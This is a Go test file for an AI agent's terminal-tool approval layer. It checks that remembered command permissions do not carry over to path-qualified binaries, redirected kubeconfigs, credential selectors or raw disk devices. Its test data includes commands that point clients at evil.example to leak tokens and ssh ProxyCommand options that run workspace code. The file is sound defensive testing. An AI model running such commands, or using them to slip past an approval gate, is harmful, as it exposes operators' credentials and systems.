package tools

import (
	"context"
	"testing"

	"selfmind/internal/executionenv"
)

func classArgs(command string, mode SandboxMode) map[string]interface{} {
	return map[string]interface{}{"_tool_name": "terminal", "command": command, "_effective_sandbox_mode": string(mode)}
}

// A class names a program as the bare name a remembered permission was given
// for. A path runs whatever file sits there, and a case-sensitive filesystem
// may hold a different `KUBECTL`, so none of these is the class `kubectl get`.
func TestClassNeedsTheExactBareProgramName(t *testing.T) {
	scope := ExecutionScope{WorkspaceID: "ws-exact", WorkspaceRoot: "/work/exact"}
	for _, command := range []string{
		"./kubectl get pods",
		"bin/kubectl get pods",
		"/usr/local/bin/kubectl get pods",
		"KUBECTL get pods",
		"Kubectl get pods",
		"./nice kubectl get pods",
		"NICE kubectl get pods",
		"/tmp/x/timeout 5 kubectl get pods",
		"./ls && kubectl get pods",
	} {
		for _, mode := range []SandboxMode{SandboxIsolated, SandboxHost} {
			if key := approvalPatternKeyForScope("terminal", classArgs(command, mode), "", scope, true); key != "" {
				t.Errorf("%q (%s) minted class key %q", command, mode, key)
			}
		}
		if rule, ok := approvalCommandPrefix("terminal", classArgs(command, SandboxIsolated)); ok {
			t.Errorf("%q offered prefix rule %q", command, rule)
		}
	}
	// The constraint that must change the result: the bare names, alone or
	// behind a wrapper that changes nothing about who runs them, keep it.
	for _, command := range []string{"kubectl get pods", "nice kubectl get pods", "timeout 5 kubectl get pods", "ls && kubectl get pods"} {
		if prefix, ok := grantClassOf(command); !ok || grantPrefixLabel(prefix) != "kubectl get" {
			t.Errorf("%q lost its class: %v %v", command, prefix, ok)
		}
	}
}

// The reviewed reproduction: a remembered host class for `kubectl get`
// released `./kubectl get pods`, a workspace file borrowing the name.
func TestRememberedHostClassNeverReleasesAPathQualifiedProgram(t *testing.T) {
	store := newFakeGrantStore()
	scope := ExecutionScope{
		TenantID: "tenant-exact", PersonID: "person-exact", WorkspaceID: "ws-exact", WorkspaceRoot: "/work/exact",
		ApprovalMode: ApprovalOnRequest, Grants: store, StandingGrants: InteractiveStandingGrants(),
	}
	key := approvalPatternKeyForScope("terminal", classArgs("kubectl get pods", SandboxHost), HostEscapeApprovalReason, scope, true)
	if key == "" {
		t.Fatal("the bare read must mint a class for this test to mean anything")
	}
	store.granted[store.key("person", scope.PersonID, key)] = true
	asks := 0
	scope.Approval = func(context.Context, ToolApprovalRequest) (ToolApprovalDecision, error) {
		asks++
		return ToolApprovalDecision{Approved: true, ApprovalID: "apr-exact"}, nil
	}
	t.Cleanup(SetExecutionScope("person-exact", scope))
	run := func(command string) {
		exec := SmartApprovalMiddleware("")(func(map[string]interface{}) (string, error) { return "ok", nil })
		args := classArgs(command, SandboxHost)
		args["_tenant_id"] = "person-exact"
		if _, err := exec(args); err != nil {
			t.Fatalf("%q: %v", command, err)
		}
	}
	run("kubectl get pods")
	if asks != 0 {
		t.Fatalf("the remembered class must release its own command: asks=%d", asks)
	}
	for _, command := range []string{"./kubectl get pods", "bin/kubectl get pods", "KUBECTL get pods", "./nice kubectl get pods"} {
		before := asks
		run(command)
		if asks != before+1 {
			t.Errorf("%q was released by the remembered bare class", command)
		}
	}
}

// What a command reads can run code: a kubeconfig names credential plugins, an
// ssh option a ProxyCommand, and a redirected server receives the operator's
// token. An assignment the run's environment does not already hold, or an
// option that points the program at configuration or credentials the command
// chooses, leaves no class.
func TestClassDropsForAssignmentsAndConfigurationSelectors(t *testing.T) {
	scope := ExecutionScope{WorkspaceID: "ws-selector", WorkspaceRoot: "/work/selector"}
	for _, command := range []string{
		"KUBECONFIG=./kc kubectl get pods",
		"kubectl get pods --kubeconfig ./kc",
		"kubectl get pods --kubeconfig=./kc",
		"kubectl get pods --as system:admin",
		"kubectl get pods -s https://evil.example",
		"kubectl get pods --server=https://evil.example",
		"export KUBECONFIG=./kc; kubectl get pods",
		"KUBECONFIG=./kc; kubectl get pods",
		"AWS_PROFILE=prod aws s3api list-buckets",
		"aws s3api list-buckets --endpoint-url http://evil.example",
		"aws s3api list-buckets --profile",
		"gcloud builds list --impersonate-service-account sa@example.iam.gserviceaccount.com",
		"helm list --kubeconfig ./kc",
		"docker ps --config ./dockercfg",
		"docker ps -H tcp://evil.example",
		"gh api repos/o/r --hostname evil.example",
		"ssh -o ProxyCommand=./run build.example.test uptime",
		"ssh -oProxyCommand=./run build.example.test uptime",
		"ssh -F ./ssh_config build.example.test uptime",
		"rsync -e ./run src dst:",
		"socat - TCP:build.example.test:80",
	} {
		for _, mode := range []SandboxMode{SandboxIsolated, SandboxHost} {
			if key := approvalPatternKeyForScope("terminal", classArgs(command, mode), "", scope, true); key != "" {
				t.Errorf("%q (%s) minted class key %q", command, mode, key)
			}
		}
		if rule, ok := approvalCommandPrefix("terminal", classArgs(command, SandboxIsolated)); ok {
			t.Errorf("%q offered prefix rule %q", command, rule)
		}
	}
	// The constraint that must change the result: options that select nothing
	// about configuration or credentials keep the class.
	for _, command := range []string{"kubectl get pods -n kube-system -o wide", "aws s3api list-buckets --region us-east-1", "gcloud builds list --limit 5"} {
		if key := approvalPatternKeyForScope("terminal", classArgs(command, SandboxIsolated), "", scope, true); key == "" {
			t.Errorf("%q lost its class", command)
		}
	}
}

// A host rule stands for its command the same way: a path-qualified client or
// an option that makes it run a program offers no "network access to" rule.
func TestHostRuleNeedsTheSameCommandAClassDoes(t *testing.T) {
	for _, command := range []string{
		"ssh -o ProxyCommand=./run build.example.test uptime",
		"./curl https://api.example.test/items",
		"CURL https://api.example.test/items",
	} {
		if host, ok := approvalEgressHost("terminal", classArgs(command, SandboxIsolated)); ok {
			t.Errorf("%q offered host rule %q", command, host)
		}
	}
	if host, ok := approvalEgressHost("terminal", classArgs("ssh build.example.test uptime", SandboxIsolated)); !ok || host != "build.example.test" {
		t.Errorf("the plain client lost its host rule: %q %v", host, ok)
	}
}

// A selector that names an entry of the operator's own configuration — a
// profile, a context, an account — is the identity the call acts as. It joins
// the class instead of dropping it, so the daily `--profile cw3` workflow keeps
// its standing answer and that answer never releases another identity.
func TestBoundSelectorBecomesPartOfTheClass(t *testing.T) {
	for _, tc := range []struct{ command, class string }{
		{"aws codebuild batch-get-builds --ids b --profile cw3", "aws codebuild batch-get-builds --profile=cw3"},
		{"aws codebuild batch-get-builds --profile=cw3 --ids c", "aws codebuild batch-get-builds --profile=cw3"},
		{"aws codebuild batch-get-builds --ids b --profile prod", "aws codebuild batch-get-builds --profile=prod"},
		{"aws codebuild batch-get-builds --ids b", "aws codebuild batch-get-builds"},
		{"kubectl get pods --context prod", "kubectl get --context=prod"},
		{"gcloud builds list --account ops@example.com", "gcloud builds list --account=ops@example.com"},
		{"helm list --kube-context prod", "helm list --kube-context=prod"},
	} {
		if prefix, ok := grantClassOf(tc.command); !ok || grantPrefixLabel(prefix) != tc.class {
			t.Errorf("%q: class %q (%v), want %q", tc.command, grantPrefixLabel(prefix), ok, tc.class)
		}
	}
	if rule, ok := approvalCommandPrefix("terminal", classArgs("aws codebuild batch-get-builds --profile cw3", SandboxIsolated)); ok {
		t.Errorf("a literal prefix rule %q cannot name the profile it was granted under", rule)
	}
}

// An assignment that repeats what the run's environment already holds changes
// nothing, so the snapshot vouches for it; any other value does not.
func TestAssignmentTheSnapshotVouchesForKeepsTheClass(t *testing.T) {
	registry := executionenv.NewRegistry()
	previous := executionenv.DefaultRegistry()
	executionenv.SetDefaultRegistry(registry)
	t.Cleanup(func() { executionenv.SetDefaultRegistry(previous) })
	snapshot := registry.Install([]string{"PATH=/usr/bin:/bin", "TZ=UTC"}, "inherited", "principal-vouch", nil)
	registry.BindLease("lease-vouch", snapshot.ID)
	t.Cleanup(SetExecutionScope("person-vouch", ExecutionScope{
		TenantID: "tenant-vouch", PersonID: "person-vouch", WorkspaceID: "ws-vouch", WorkspaceRoot: "/work/vouch", LeaseID: "lease-vouch",
	}))
	args := func(command string) map[string]interface{} {
		a := classArgs(command, SandboxIsolated)
		a["_tenant_id"] = "person-vouch"
		return a
	}
	if _, ok := grantCommandPrefix("terminal", args("TZ=UTC kubectl get pods")); !ok {
		t.Error("an assignment the snapshot already holds must keep the class")
	}
	for _, command := range []string{"TZ=Asia/Shanghai kubectl get pods", "TZ+=x kubectl get pods", "LANG=C kubectl get pods"} {
		if prefix, ok := grantCommandPrefix("terminal", args(command)); ok {
			t.Errorf("%q kept class %v", command, prefix)
		}
	}
}

// End to end: a remembered `kubectl get` does not release the same read
// pointed at another kubeconfig.
func TestRememberedClassNeverReleasesARedirectedConfiguration(t *testing.T) {
	asks := &classAsks{}
	person, _ := classKeyScope(t, ApprovalOnRequest, asks)
	if ran, _ := runClassKeyCall(person, "kubectl get pods"); !ran {
		t.Fatal("first call must run after the ask")
	}
	for _, tc := range []struct{ command, class string }{
		{"KUBECONFIG=./kc kubectl get pods", ""},
		{"kubectl get pods --kubeconfig ./kc", ""},
		{"kubectl get pods --context prod", `"kubectl get --context=prod" commands`},
	} {
		before := len(asks.requests)
		_, _ = runClassKeyCall(person, tc.command)
		if len(asks.requests) != before+1 {
			t.Errorf("%q was released by the remembered \"kubectl get\" class", tc.command)
		}
		if class := asks.requests[len(asks.requests)-1].GrantClass; class != tc.class {
			t.Errorf("%q offered remember option %q, want %q", tc.command, class, tc.class)
		}
	}
}

// A payload naming a raw block device is dangerous for what it touches, so no
// class or prefix rule bounds it: a remembered `smartctl --scan` must not
// release `smartctl -t long /dev/disk0`. The markers are the floor's own disk
// prefixes, the macOS whole-disk nodes included.
func TestNoClassNamesARawDiskDevice(t *testing.T) {
	for _, command := range []string{
		"smartctl -a /dev/disk0",
		"smartctl -t long /dev/rdisk2",
		"smartctl -a /dev/DISK0",
		"hdparm -I /dev/hda",
		"blkid /dev/vda1",
		"xfs_info /dev/xvda1",
	} {
		args := map[string]interface{}{"command": command}
		if prefix, ok := grantCommandPrefix("terminal", args); ok {
			t.Errorf("%q minted class %v", command, prefix)
		}
		if rule, ok := approvalCommandPrefix("terminal", args); ok {
			t.Errorf("%q offered prefix rule %q", command, rule)
		}
	}
	// The constraint that must change the result: the same program naming
	// no device keeps its class.
	if _, ok := grantCommandPrefix("terminal", map[string]interface{}{"command": "smartctl --scan"}); !ok {
		t.Error("smartctl --scan names no device and keeps its class")
	}
}

// tool-safety.md names the classes that stay one-shot on the host because the
// heuristic flags them for their own effect; mv is not one of them.
func TestHostClassFollowsTheHeuristicsOwnReason(t *testing.T) {
	scope := ExecutionScope{TenantID: "tenant-mv", PersonID: "person-mv", WorkspaceID: "ws-mv", WorkspaceRoot: "/work/mv"}
	for command, remembered := range map[string]bool{
		"chmod 755 script.sh": false, "chown me build": false, "kill 4242": false, "pkill node": false,
		"mv build dist": true,
	} {
		args := map[string]interface{}{"_tool_name": "terminal", "command": command, "_effective_sandbox_mode": string(SandboxHost)}
		_, reason := dangerousToolCall("", "terminal", args)
		if key := approvalPatternKeyForScope("terminal", args, reason, scope, true); (key != "") != remembered {
			t.Errorf("%q: host class %q, want remembered=%v (reason %q)", command, key, remembered, reason)
		}
	}
}
